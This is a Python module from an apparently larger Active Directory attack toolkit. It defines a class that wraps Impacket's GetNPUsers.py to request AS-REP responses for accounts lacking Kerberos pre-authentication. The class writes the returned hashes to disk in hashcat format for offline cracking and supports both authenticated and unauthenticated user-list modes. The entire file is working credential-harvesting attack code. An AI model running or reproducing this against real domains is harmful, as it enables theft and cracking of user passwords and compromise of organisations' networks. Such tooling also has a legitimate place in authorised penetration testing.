"""
AS-REP Roast Hash Extractor — Requests AS-REP responses for
accounts that do not require Kerberos pre-authentication.

Wraps Impacket's GetNPUsers.py with support for both authenticated
enumeration and unauthenticated user-list attacks.
"""

import subprocess
from pathlib import Path
from typing import List

from ..core.target import RoastingTarget


class ASREPExtractor:
    """Extract AS-REP hashes via Impacket."""

    def __init__(self, domain: str, username: str = "", password: str = "",
                 dc_ip: str = "", output_dir: Path = None):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.output_dir = output_dir or Path("roasting")

    def extract(self, targets: List[RoastingTarget]) -> List[str]:
        """Request AS-REP tickets and write hashes to disk."""
        print(f"\n{'=' * 60}")
        print("AS-REP ROAST HASH EXTRACTION")
        print(f"{'=' * 60}")

        if not targets:
            print("[-] No AS-REP Roastable accounts found")
            return []

        print(f"[*] Requesting AS-REP for {len(targets)} accounts...")

        hash_file = str(self.output_dir / "asrep_hashes.txt")
        userlist_file = self._write_userlist(targets)
        cmd = self._build_command(hash_file, str(userlist_file))

        print(f"[*] Executing: {' '.join(cmd)}")

        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=120)

            if Path(hash_file).exists():
                with open(hash_file) as f:
                    hashes = [
                        line.strip() for line in f
                        if line.strip() and line.startswith("$")
                    ]
                print(f"[+] Extracted {len(hashes)} AS-REP hashes")
                return hashes
            return []

        except FileNotFoundError:
            print("[-] GetNPUsers.py not found — install Impacket")
            return []
        except Exception as e:
            print(f"[-] AS-REP extraction failed: {e}")
            return []

    def _write_userlist(self, targets: List[RoastingTarget]) -> Path:
        """Write target usernames to a file for GetNPUsers."""
        userlist = self.output_dir / "asrep_users.txt"
        with open(userlist, "w") as f:
            for t in targets:
                f.write(f"{t.username}\n")
        return userlist

    def _build_command(self, hash_file: str, userlist_file: str) -> List[str]:
        """Build the GetNPUsers.py command line."""
        if self.password:
            return [
                "GetNPUsers.py",
                f"{self.domain}/{self.username}:{self.password}",
                "-dc-ip", self.dc_ip,
                "-format", "hashcat",
                "-outputfile", hash_file,
                "-request",
            ]
        return [
            "GetNPUsers.py",
            f"{self.domain}/",
            "-usersfile", userlist_file,
            "-dc-ip", self.dc_ip,
            "-format", "hashcat",
            "-outputfile", hash_file,
        ]